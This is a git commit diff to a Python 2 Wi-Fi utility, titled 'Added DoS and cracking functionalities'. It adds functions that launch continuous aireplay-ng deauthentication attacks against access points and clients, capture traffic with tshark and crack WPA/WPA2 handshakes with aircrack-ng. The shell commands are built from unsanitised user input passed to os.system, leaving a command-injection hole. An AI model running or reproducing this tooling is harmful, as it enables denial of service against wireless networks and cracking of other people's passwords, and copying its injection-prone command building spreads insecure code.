d49726006ee427b767a71464afcfde02207d7e54
rjruizfdez <rjruizfdez@gmail.com>
2018-03-17 05:12:20 -0700

    Added DoS and cracking functionalities

--- main.py
+++ main.py
@@ -1,40 +1,60 @@
+import os
+import sys
 from wifi import Cell, Scheme
-import os,sys
 
 #interfaz = 'wlxc04a00118487'
 interfaz = raw_input('Network interface: ')
-list_ = []
+os.system("sudo ifconfig "+interfaz+" down")
+os.system("sudo ifconfig "+interfaz+" up")
 redes = []
 
-while len(list_) == 0:
-	list_ = Cell.all(interfaz)
 
-for i in list_:
-	ssid = i.ssid
-	mac = i.address
-	frecuencia = i.frequency
-	canal = i.channel
-	max_rate= i.bitrates[len(i.bitrates)-1]
-	if i.encrypted:
-		cifrado = i.encryption_type
+def menu():
+	opt_ = raw_input('Options: \n1: Scan \n2: Connect \n3: Capture traffic\n4: Crack WPA/WPA2 traffic file \n')
+	if opt_ == "1":
+		scan()
+	elif opt_=="2":
+		connect()
+	elif opt_=="3":
+		capture_traffic()
+	elif opt_=="4":
+		crack_wpa()
+	elif opt_=="5":
+		deauth_ap()
+	elif opt_=="6":
+		deauth_client()
 	else:
-		cifrado = "None"
-	redes.append( ( str(ssid), str(cifrado), str(mac), str(frecuencia), str(canal), str(max_rate) ) )
+		print "Unknown option"
 
-count = 0
-print "a"
-for red in redes:
-	print "- ", red[0],"(ID = ",count,")"
-	print "   Info: ("+red[1]+", "+red[2]+", "+red[3]+", "+red[4]+", "+red[5]+")"
-	count+=1
 
-opt_ = raw_input('Options: \n1: Connect \n2: Attack \n\n')
+def deauth_client():
+	ap_mac = raw_input("AP MAC:")
+	client_mac = raw_input("Client MAC:")
+	os.system("aireplay-ng -0 0 -a "+ap_mac+"-c "+client_mac+" "+interfaz)
 
-if opt_=="1":
+
+def deauth_ap():
+	ap_mac = raw_input("AP MAC:")
+	os.system("aireplay-ng -0 0 -a "+ap_mac+" "+interfaz)
+
+
+def crack_wpa():
+	dictionary = raw_input("Dictionary file: ")
+	pcap_name = raw_input("Pcap file name: ")
+	os.system("aircrack-ng -w "+dictionary+" "+pcap_name)
+
+
+def capture_traffic():
+	pcap_name = raw_input("Pcap file name: ")
+	os.system("touch "+pcap_name)
+	os.system("chmod 777 "+pcap_name)
+	os.system("sudo tshark -w "+pcap_name+" -i "+interfaz)
+
+
+def connect():
 	id_red = raw_input('Select id: ')
-
 	essid=redes[int(id_red)][0]
-	conf_file="supp.conf"
+	conf_file="temp/supp.conf"
 
 	is_psk = raw_input("Is WPA-PSK? (y/N)")
 	if is_psk == "y":
@@ -56,5 +76,30 @@ if opt_=="1":
 			#os.system("rm "+conf_file)
 
 
-else:
-	print "Unknown option"
+def scan():
+	global redes
+	list_ = []
+	redes = []
+	print "\nScanning...\n"
+	while len(list_) == 0:
+		list_ = Cell.all(interfaz)
+	for i in list_:
+		ssid = i.ssid
+		mac = i.address
+		frecuencia = i.frequency
+		canal = i.channel
+		max_rate= i.bitrates[len(i.bitrates)-1]
+		if i.encrypted:
+			cifrado = i.encryption_type
+		else:
+			cifrado = "None"
+		redes.append( ( str(ssid), str(cifrado), str(mac), str(frecuencia), str(canal), str(max_rate) ) )
+	count = 0
+	for red in redes:
+		print "- ", red[0],"(ID = ",count,")"
+		print "   Info: ("+red[1]+", "+red[2]+", "+red[3]+", "+red[4]+", "+red[5]+")"
+		count+=1
+	menu()
+
+scan()
+menu()
